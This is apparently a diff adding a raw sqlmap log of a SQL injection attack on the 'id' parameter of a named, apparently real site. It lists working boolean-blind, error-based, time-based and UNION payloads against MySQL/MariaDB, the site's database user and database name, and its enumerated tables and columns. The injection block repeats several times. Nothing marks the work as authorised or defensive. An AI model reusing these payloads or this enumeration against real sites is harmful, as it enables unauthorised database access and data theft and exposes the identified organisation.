@@ -1,0 +1,179 @@
+sqlmap identified the following injection point(s) with a total of 63 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 2090=2090
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=18 AND (SELECT 2549 FROM(SELECT COUNT(*),CONCAT(0x71767a7671,(SELECT (ELT(2549=2549,1))),0x7178787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 6678 FROM (SELECT(SLEEP(5)))IrUl)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-4185 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71767a7671,0x546c594748576f524b5365436946446a59486d5a78735778717a596c786c7079574d794c6e4e5a75,0x7178787171),NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+current user: 'csiindia65_user@localhost'
+current database: 'csiindia65_csiindia'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 2090=2090
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=18 AND (SELECT 2549 FROM(SELECT COUNT(*),CONCAT(0x71767a7671,(SELECT (ELT(2549=2549,1))),0x7178787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 6678 FROM (SELECT(SLEEP(5)))IrUl)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-4185 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71767a7671,0x546c594748576f524b5365436946446a59486d5a78735778717a596c786c7079574d794c6e4e5a75,0x7178787171),NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+Database: csiindia65_csiindia
+[4 tables]
++----------------------+
+| category             |
+| menu                 |
+| news                 |
+| upload_file_category |
++----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 2090=2090
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=18 AND (SELECT 2549 FROM(SELECT COUNT(*),CONCAT(0x71767a7671,(SELECT (ELT(2549=2549,1))),0x7178787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 6678 FROM (SELECT(SLEEP(5)))IrUl)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-4185 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71767a7671,0x546c594748576f524b5365436946446a59486d5a78735778717a596c786c7079574d794c6e4e5a75,0x7178787171),NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+available databases [2]:
+[*] csiindia65_csiindia
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 2090=2090
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=18 AND (SELECT 2549 FROM(SELECT COUNT(*),CONCAT(0x71767a7671,(SELECT (ELT(2549=2549,1))),0x7178787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 6678 FROM (SELECT(SLEEP(5)))IrUl)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-4185 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71767a7671,0x546c594748576f524b5365436946446a59486d5a78735778717a596c786c7079574d794c6e4e5a75,0x7178787171),NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+Database: csiindia65_csiindia
+Table: news
+[8 columns]
++------------------+---------------+
+| Column           | Type          |
++------------------+---------------+
+| file_doc         | varchar(255)  |
+| news_date        | datetime      |
+| news_description | varchar(2000) |
+| news_file_path   | varchar(300)  |
+| news_id          | int(11)       |
+| news_status      | varchar(10)   |
+| news_title       | varchar(500)  |
+| serial_no        | int(11)       |
++------------------+---------------+
+
+Database: csiindia65_csiindia
+Table: upload_file_category
+[9 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| doc_file_name | varchar(200) |
+| file_date     | date         |
+| file_id       | int(11)      |
+| file_title    | varchar(200) |
+| main_cat_id   | int(11)      |
+| pdf_file_name | varchar(200) |
+| pub_month     | int(11)      |
+| pub_year      | int(11)      |
+| serial_no     | int(11)      |
++---------------+--------------+
+
+Database: csiindia65_csiindia
+Table: category
+[3 columns]
++---------------+-------------+
+| Column        | Type        |
++---------------+-------------+
+| cat_id        | int(11)     |
+| cat_name      | varchar(50) |
+| parent_cat_id | int(11)     |
++---------------+-------------+
+
+Database: csiindia65_csiindia
+Table: menu
+[7 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| fa_class       | varchar(100) |
+| menu_id        | int(11)      |
+| menu_status    | varchar(10)  |
+| menu_title     | varchar(100) |
+| parent_menu_id | int(11)      |
+| path_to_page   | varchar(500) |
+| serial_no      | int(11)      |
++----------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=18 AND 2090=2090
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=18 AND (SELECT 2549 FROM(SELECT COUNT(*),CONCAT(0x71767a7671,(SELECT (ELT(2549=2549,1))),0x7178787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=18 AND (SELECT 6678 FROM (SELECT(SLEEP(5)))IrUl)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=-4185 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71767a7671,0x546c594748576f524b5365436946446a59486d5a78735778717a596c786c7079574d794c6e4e5a75,0x7178787171),NULL,NULL,NULL,NULL-- -
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
